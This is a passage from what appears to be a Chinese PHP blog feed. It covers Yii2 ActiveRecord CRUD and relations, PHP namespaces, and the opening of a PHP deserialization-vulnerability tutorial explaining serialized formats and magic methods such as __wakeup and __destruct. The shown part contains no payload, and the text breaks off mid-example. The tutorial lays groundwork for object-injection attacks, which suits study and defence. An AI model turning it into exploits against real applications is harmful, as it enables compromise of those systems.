class="params">()</span>-&gt;</span>all();</span><br></pre></td></tr></table></figure><p>批量查询<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach<span class="function"><span class="params">(Test::find()-&gt;batch(<span class="number">1</span>) as $tests)</span>&#123;</span></span><br><span class="line"><span class="function">      <span class="title">printf</span><span class="params">(count($tests))</span>   // 每次操作一条数据 将结果放在<span class="title">$tests</span></span></span><br><span class="line"><span class="function">    &#125;</span></span><br></pre></td></tr></table></figure></p><p>进行删除操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$results = Test::find()-&gt;where([<span class="string">'id'</span>]=&gt;<span class="number">1</span>)-&gt;all();</span><br><span class="line">    $results[<span class="number">0</span>]-&gt;delete();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二中方法,及利用占位符</span></span><br><span class="line">    Test::deleteAll(<span class="string">'id&gt;:id'</span>,<span class="keyword">array</span>(<span class="string">':id'</span>=&gt;<span class="number">0</span>)); <span class="comment">//</span></span><br></pre></td></tr></table></figure></p><p>进行增加数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = <span class="keyword">new</span> Test;</span></span><br><span class="line"><span class="php">    $test-&gt;id = <span class="number">3</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;title  = <span class="string">'title3'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;save();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>接下来使用rules 进行验证<br>model文件夹下的Test.php内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">models</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">ActiveRecord</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">ActiveRecord</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> [</span></span><br><span class="line"><span class="php">    [<span class="string">'id'</span>,<span class="string">'integer'</span>],</span></span><br><span class="line"><span class="php">    [<span class="string">'tittle'</span>,<span class="string">'string'</span>,<span class="string">'length'</span>=&gt;[<span class="number">0</span>,<span class="number">5</span>]]</span></span><br><span class="line"><span class="php">    ];</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>控制器HelloController.php代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">models</span>\<span class="title">Test</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = <span class="keyword">new</span> Test;</span></span><br><span class="line"><span class="php">    $test-&gt;id = <span class="string">'zxc'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;tittle  = <span class="string">'title3'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;validate();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($test-&gt;hasErrors())&#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"data is error"</span>;</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $test-&gt;save();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>当id 为字符时  不满足验证器0-5 的访问  返回data  error</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0n6zz19mjj30jb06qmxa.jpg" alt=""></p><p>接下来进行修改操作</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">models</span>\<span class="title">Test</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = Test::find()-&gt;where([<span class="string">'id'</span>=&gt;<span class="number">1</span>])-&gt;one();  <span class="comment">//取出一角数据放在noe 而不是all()</span></span></span><br><span class="line"><span class="php">    $test-&gt;tittle = <span class="string">'title4'</span>;  <span class="comment">// 进行修改</span></span></span><br><span class="line"><span class="php">    $test-&gt;save();  <span class="comment">// 然后进行保存</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以加个判断<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0n7inujhij30x90fhwg0.jpg" alt=""><br>接下来进行 <strong>关联查询</strong><br>所谓关联查询 就是 比如有两张表 1顾客表 2订单表 多个订单对应一个顾客  形成一对多的关系 一个订单对应 一个顾客 形成一对一的关系</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncblgpkvj30re0e5jtk.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0nccfw7spj30wk0ewmzh.jpg" alt=""><br>接下来编写 order.php  customer.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0nc9oikinj311b0gz40d.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncap4qgxj30zw0at3z1.jpg" alt=""></p><p>成功得到数据</p><p>但是在控制器进行数据库的操作不满足mvc 在model类 进行封装一个 操作数据库的类<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncmus1rgj31160jbjtm.jpg" alt=""></p><p>  在进行查询的时候 会把查询内容放到select 语句中,当这个数据更新时不会再进行select 而是拿上次slect 的结果 所以如果要再进行select 时  需要用unset()释放那个结果</p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>namespace命名空间</title>
      <link href="/2019/02/26/namespace%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"/>
      <url>/2019/02/26/namespace%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="namespace解决命名冲突问题"><a href="#namespace解决命名冲突问题" class="headerlink" title="namespace解决命名冲突问题"></a>namespace解决命名冲突问题</h2><p>a.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// namespace a\b\c;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is A'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>b.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// namespace a\b\d;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is B'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span>(<span class="symbol">'a</span>.php');</span><br><span class="line"><span class="keyword">include</span>(<span class="symbol">'b</span>.php');</span><br></pre></td></tr></table></figure><p>访问index.php时会报错<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4cyogo9j30ui023q2w.jpg" alt=""><br>当加上namepase时, 就不会报错</p><p>当实例化对象时 也要加上命名空间</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$a</span> = new a\b\c\Apple();</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$a</span>-&gt;get_info();</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4jt2b20j30fd043q2q.jpg" alt=""><br>可以加上use a\b\c\Apple<br>以后实例化就不用加上前面的重复代码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span><br><span class="line">$a = <span class="keyword">new</span> Apple();</span><br><span class="line">$a2 = <span class="keyword">new</span> Apple();</span><br><span class="line">$a3 = <span class="keyword">new</span> Apple();</span><br><span class="line"></span><br><span class="line">$a-&gt;get_info();</span><br><span class="line">$a2-&gt;get_info();</span><br><span class="line">$a3-&gt;get_info();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4nnecr0j309l01n0si.jpg" alt=""><br>如果我们想实例化B.php里面的Apple时</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$b</span> = new a\b\d\Apple();</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$b</span>-&gt;get_info();</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4sqmw2ej307202fgld.jpg" alt=""><br>但是如果我们多次使用时也会造成 重复多余<br>如果加上use a\b\d\Apple;<br>会与use a\b\c\Apple  产生冲突 ,于是利用取别名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">d</span>\<span class="title">Apple</span> <span class="title">as</span> <span class="title">BApple</span>;</span><br><span class="line"><span class="comment">// $a = new Apple();</span></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> BApple();</span><br><span class="line"></span><br><span class="line">$b-&gt;get_info();</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4wu4ur7j305301u3y9.jpg" alt=""></p><p>当有个c.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is C'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>当在index.php调用c.php中的Apple<br>此为全局顶层类,要想对全局顶层类进行实例化 需要在实例化加上反斜杠</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'a.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'b.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'c.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">d</span>\<span class="title">Apple</span> <span class="title">as</span> <span class="title">BApple</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$b = <span class="keyword">new</span> BApple();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> \Apple();</span></span><br><span class="line"><span class="php">$c-&gt;get_info();</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k54g6i57j309n02ejr5.jpg" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php反序列化漏洞入门到放弃</title>
      <link href="/2019/01/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/"/>
      <url>/2019/01/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>序列化就是:<br>将php变量比如php数组或者对象转换为字节流,字节流可以储存在数据库里面</p><p>相关函数:</p><pre><code>serialize()              //将对象转换为字符串unserialize()           // 将字符串还原为一个对象addslashes()                // 对写入数据库的数据进行处理,stripslashes()                //对数据进行处理</code></pre><p>   相关方法:</p><pre><code>__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发,调用不到方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><strong>例子</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $flag = <span class="string">"123"</span>;   <span class="comment">//序列化后为 &lt;0x00&gt;test&lt;0x00&gt;flag</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $flag1 = <span class="string">"123"</span>;   <span class="comment">//序列化后为flag</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $a =<span class="string">"aaa"</span>;        <span class="comment">// 序列化后为a</span></span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> $b =<span class="string">"bbb"</span>;        <span class="comment">// 序列化后不存在与序列化后的字符串内   </span></span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $c= <span class="string">"ccc"</span>;     <span class="comment">//序列化后  &lt;0x00&gt;*&lt;0x00&gt;c</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$test1  = <span class="keyword">new</span> test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$data = serialize($test1); <span class="comment">//将对象进行序列化为字符串</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $data.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输出</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"test"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"&lt;0x00&gt;&lt;test&gt;&lt;0x00&gt;flag"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"flag1"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"aaa"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"&lt;0x00&gt;*&lt;0x00&gt;c"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"ccc"</span>;&#125;</span><br></pre></td></tr></table></figure><p>0:4:”test”:4<br>代表 O为对象 站四个字符为test 有4个属性<br>{} 里面的为 属性昵称 和 属性值<br>格式:{类型:变量长度:”变量名”；类型:变量值长度:”变量值”}  //六个 : 为一组 前三个代表属性名 后三个代表属性值</p><p>注:<br>私有属性会在 text两边加上空子节 所以长度为10<br>保护属性同样也会在*两边加空字节<0x00><0x00></0x00></0x00></p><p><strong>进行反序列化</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data1</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">//<span class="built_in">echo</span> <span class="variable">$data1</span>.<span class="string">"\n"</span>;  <span class="built_in">echo</span> 只能输出字符串且不换行  所以输出对象时会报错</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$data1</span>);</span><br></pre></td></tr></table></figure><pre><code>object(test)#2 (4) {  [&quot;flag&quot;:&quot;test&quot;:private]=&gt;  string(3) &quot;123&quot;  [&quot;flag1&quot;]=&gt;  string(3) &quot;123&quot;  [&quot;a&quot;]=&gt;  string(3) &quot;aaa&quot;  [&quot;c&quot;:protected]=&gt;  string(3) &quot;ccc&quot;}</code></pre><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><strong>__sleep()</strong><br>在进行序列化的时候<br>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误</p><p>通俗的讲就是 对象的哪些属性应该被序列化<br><strong>sleep方法<strong>必须返回一个数组</strong>,包含需要串行化的属性. PHP会抛弃其它属性的值. 如果没有</strong>sleep方法,PHP将保存所有属性.</p><p><strong>__wakeup()</strong><br>unserialize() 会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 </strong>wakeup 方法，预先准备对象需要的资源。<br><strong>wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。<br>通俗讲就是还会对</strong>wakeup里面的属性进行反序列化</p><p>这两个方法都不接受参数,</p><p><strong>实例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ID = $ID;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sex = $sex;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;age = $age;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;a = <span class="string">"aaa"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;b = <span class="string">"bbb"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];  <span class="comment">// info 属性不会被序列化</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;c = <span class="string">"ccc"</span>;  <span class="comment">// 属性c会被序列化 属性a不会</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span 